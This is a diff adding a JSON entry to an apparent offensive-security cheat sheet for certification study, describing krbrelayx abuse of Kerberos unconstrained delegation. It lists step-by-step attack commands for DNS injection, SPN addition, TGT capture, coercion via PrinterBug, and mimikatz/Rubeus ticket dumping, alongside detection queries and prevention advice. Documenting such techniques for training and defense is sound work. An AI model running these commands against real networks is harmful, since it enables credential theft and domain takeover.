@@ -1,0 +1,103 @@
+{
+  "id": "ad-krbrelayx",
+  "name": "krbrelayx - Kerberos Relay & Unconstrained Delegation Abuse",
+  "command": "python3 krbrelayx.py -hashes :<hash> -t ldap://<dc_ip> --dc-ip <dc_ip> -wh attacker-wpad --delegate-access",
+  "description": "krbrelayx by dirkjanm abuses unconstrained delegation by capturing Kerberos tickets (TGTs) forwarded to compromised hosts. It includes krbrelayx.py (Kerberos relay), addspn.py (SPN manipulation), and dnstool.py (DNS record injection). Together they enable RBCD attacks, TGT extraction, and domain compromise from unconstrained delegation machines.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Delegation Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "dirkjanm/krbrelayx; CRTP delegation module",
+  "tags": [
+    "krbrelayx",
+    "kerberos-relay",
+    "unconstrained-delegation",
+    "tgt-capture",
+    "rbcd",
+    "dirkjanm"
+  ],
+  "mitre": [
+    "T1558",
+    "T1550.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nUnconstrained delegation machines store TGTs of connecting users.\nkrbrelayx captures these TGTs in real-time via a listener.\nCombine with PrinterBug/PetitPotam to coerce DC TGTs.\n\n=== STEP 1: DNS INJECTION (if needed) ===\n  python3 dnstool.py -u <domain>\\<user> -p <pass> -a add -r attacker-wpad -d <attacker_ip> <dc_ip>\n\n=== STEP 2: ADD SPN (if needed) ===\n  python3 addspn.py -u <domain>\\<user> -p <pass> -s host/attacker-wpad <dc_ip>\n\n=== STEP 3: RUN KRBRELAYX ===\n  python3 krbrelayx.py -hashes :<machine_hash> -t ldap://<dc_ip> --dc-ip <dc_ip> --delegate-access\n  # Captures incoming TGTs and uses them for RBCD setup\n\n=== STEP 4: COERCE (trigger TGT) ===\n  python3 printerbug.py <domain>/<user>:<pass>@<dc_ip> <unconstrained_host>\n  # Or PetitPotam/DFSCoerce\n\n=== ALTERNATIVE: DUMP TICKETS ===\n  # If you have local admin on the unconstrained delegation host:\n  mimikatz# sekurlsa::tickets /export\n  Rubeus.exe monitor /interval:5 /nowrap\n  # Captures TGTs of any user connecting to the host",
+  "examples": [
+    {
+      "label": "Capture and relay Kerberos tickets",
+      "command": "python3 krbrelayx.py -hashes :aad3b435b51404eeaad3b435b51404ee -t ldap://dc01.corp.local --dc-ip 192.168.1.10 --delegate-access"
+    },
+    {
+      "label": "Inject DNS record for WPAD",
+      "command": "python3 dnstool.py -u corp.local\\jdoe -p Password123 -a add -r attacker-wpad -d 192.168.1.50 192.168.1.10"
+    },
+    {
+      "label": "Add SPN for Kerberos capture",
+      "command": "python3 addspn.py -u corp.local\\jdoe -p Password123 -s host/attacker-wpad 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "krbrelayx - dirkjanm",
+      "url": "https://github.com/dirkjanm/krbrelayx"
+    },
+    {
+      "title": "dirkjanm blog - Kerberos delegation",
+      "url": "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-dfscoerce",
+      "note": "DFSCoerce triggers DC authentication; krbrelayx captures the TGT.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-shadowcoerce",
+      "note": "Another coercion method to trigger TGT forwarding.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Unconstrained delegation causes the connecting client to forward their TGT to the server. krbrelayx captures these TGTs in transit and can relay them for RBCD attacks or use them directly for impersonation.",
+    "prerequisites": "Control of a host with unconstrained delegation (or ability to set RBCD); coercion method to trigger authentication.",
+    "impact": "Domain admin compromise by capturing DC machine account TGT and using it for DCSync or RBCD.",
+    "detection": "[MITRE T1558] TGT delegation events; unusual Kerberos ticket requests; DNS record modifications.",
+    "artifacts": "Event 4768 (TGT request) from unexpected sources; DNS zone modifications; Kerberos delegation audit events.",
+    "splunk_spl": "index=windows EventCode=4768\n| where TargetUserName=\"*$\" AND ServiceName!=\"krbtgt\"\n| table _time, TargetUserName, IpAddress, ServiceName",
+    "elastic_kql": "event.code:\"4768\" AND user.name:*$ AND NOT service.name:\"krbtgt\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4768\n| where TargetUserName endswith \"$\"\n| project TimeGenerated, TargetUserName, IpAddress, ServiceName",
+    "sigma_rules": "win_security_kerberos_relay_tgt_capture",
+    "prevention": "Remove unnecessary unconstrained delegation; use constrained delegation or RBCD instead; protect tier-0 assets; monitor for DNS record injection.",
+    "sources": [
+      "CRTP delegation module",
+      "https://attack.mitre.org/techniques/T1558/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Kerberos TGT capture via unconstrained delegation",
+        "logic": "SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\" and AuthenticationPackageName == \"Kerberos\"\n| join kind=inner (\n    SecurityEvent | where EventID == 4768 | project TGTTime=TimeGenerated, TGTUser=TargetUserName, TGTSource=IpAddress\n) on $left.TargetUserName == $right.TGTUser\n| where abs(datetime_diff(\"second\", TimeGenerated, TGTTime)) < 30",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4624",
+          "4768"
+        ],
+        "attack": [
+          "T1558",
+          "T1550.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate unconstrained delegation services",
+        "tuning": "Alert on DC machine accounts connecting to non-DC servers; baseline delegation patterns"
+      }
+    ]
+  }
+}
